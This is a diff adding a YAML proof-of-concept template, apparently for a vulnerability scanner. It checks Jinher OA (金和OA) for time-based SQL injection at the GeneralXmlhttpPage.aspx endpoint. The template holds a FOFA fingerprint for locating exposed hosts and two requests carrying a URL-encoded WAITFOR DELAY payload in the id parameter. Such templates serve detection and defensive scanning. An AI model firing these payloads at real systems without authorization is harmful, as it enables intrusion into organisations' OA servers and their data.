@@ -1,0 +1,23 @@
+id: poc-yaml-jinher-generalxmlhttppage-sqli
+info:
+  name: 金和OA GeneralXmlhttpPage SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 金和OA
+  fofa: app="金和网络-金和OA"
+variables:
+  t1: random_int(5,9)
+  t2: t1 + 2
+  t3: random_int(1,4)
+  t4: t3 + 2
+requests:
+- method: GET
+  path: /C6/Jhsoft.Web.appraise/AppraiseScoreUpdate.aspx/GeneralXmlhttpPage.aspx/?id=%27and%28select%2B1%29%3E0waitfor%2F%2A%2A%2Fdelay%270%3A0%3A{{.t1}}
+  expression: status_code == 200 && contains(body,"/JHSoft.UI.Lib/") && duration >
+    t1 && duration < t2
+- method: GET
+  path: /C6/Jhsoft.Web.appraise/AppraiseScoreUpdate.aspx/GeneralXmlhttpPage.aspx/?id=%27and%28select%2B1%29%3E0waitfor%2F%2A%2A%2Fdelay%270%3A0%3A{{.t3}}
+  expression: status_code == 200 && contains(body,"/JHSoft.UI.Lib/") && duration >
+    t3 && duration < t4
+transport: http
